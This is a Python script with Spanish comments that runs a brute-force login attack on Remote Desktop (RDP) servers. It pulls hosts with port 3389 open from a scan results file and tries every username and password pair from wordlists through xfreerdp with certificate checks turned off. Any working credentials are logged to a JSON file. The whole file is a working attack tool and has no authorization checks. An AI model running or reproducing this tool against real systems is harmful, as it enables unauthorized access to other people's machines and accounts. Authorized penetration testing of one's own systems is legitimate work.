import subprocess  # Para ejecutar comandos externos (xfreerdp)
import os  # Para manejar directorios y rutas de archivos
import json  # Para guardar los resultados en formato JSON

# Carpeta donde se guardarán los resultados del ataque RDP
RDP_RESULTS_DIR = "results/rdp"

# Rutas a las wordlists de usuarios y contraseñas
WORDLIST_USER = "wordlists/users.txt"
WORDLIST_PASS = "wordlists/passwords.txt"

def fuerza_bruta_rdp(ip, port=3389):
    # Crea el directorio de resultados si no existe
    os.makedirs(RDP_RESULTS_DIR, exist_ok=True)

    # Diccionario donde se almacenarán los resultados del ataque
    resultados = {
        "host": ip,
        "port": port,
        "valid_credentials": []  # Lista para credenciales válidas encontradas
    }

    # Carga de usuarios desde la wordlist
    with open(WORDLIST_USER, "r") as f:
        usuarios = [line.strip() for line in f if line.strip()]

    # Carga de contraseñas desde la wordlist
    with open(WORDLIST_PASS, "r") as f:
        contrasenas = [line.strip() for line in f if line.strip()]

    # Inicio del ataque
    print(f"[*] Iniciando fuerza bruta RDP contra {ip}:{port}...")

    # Se prueba cada combinación de usuario y contraseña
    for usuario in usuarios:
        for contrasena in contrasenas:
            # Comando para autenticación RDP sin abrir sesión gráfica (modo auth-only)
            comando = [
                "xfreerdp", f"/u:{usuario}", f"/p:{contrasena}", f"/v:{ip}:{port}", "+auth-only",
                "/cert:ignore"  # Ignora certificados no válidos
            ]

            # Ejecuta el comando y captura la salida
            resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            salida = resultado.stdout.decode() + resultado.stderr.decode()

            # Si el código de salida indica autenticación exitosa, se guarda la credencial
            if "Authentication only, exit status 0" in salida:
                print(f"[+] Credenciales válidas encontradas: {usuario}:{contrasena}")
                resultados["valid_credentials"].append({"usuario": usuario, "password": contrasena})

    # Ruta del archivo donde se guardarán los resultados
    ruta_salida = os.path.join(RDP_RESULTS_DIR, f"rdp_{ip}_bruteforce.json")

    # Guarda los resultados en formato JSON
    with open(ruta_salida, "w") as f:
        json.dump(resultados, f, indent=4)

    # Mensaje final con la ruta del archivo
    print(f"[+] Resultados guardados en {ruta_salida}")
    return resultados  # Devuelve los resultados para posible uso posterior

def run_rdp_attack():
    """
    Ejecuta el ataque de fuerza bruta RDP contra los hosts que tengan el puerto 3389 abierto.
    Extrae la lista de objetivos del archivo scan_results.json.
    """

    # Abre y carga el archivo de resultados del escaneo
    with open("results/scan_results.json") as f:
        data = json.load(f)

    # Obtiene la lista de hosts del archivo JSON
    hosts = data.get("hosts", [])

    # Itera sobre cada host
    for host in hosts:
        ip = host.get("ip")  # Extrae la IP
        # Recorre los puertos abiertos del host
        for port_info in host.get("open_ports", []):
            # Si el puerto 3389 está abierto, ejecuta el ataque
            if port_info.get("port") == 3389:
                fuerza_bruta_rdp(ip)
                break  # Evita escanear el mismo host más de una vez
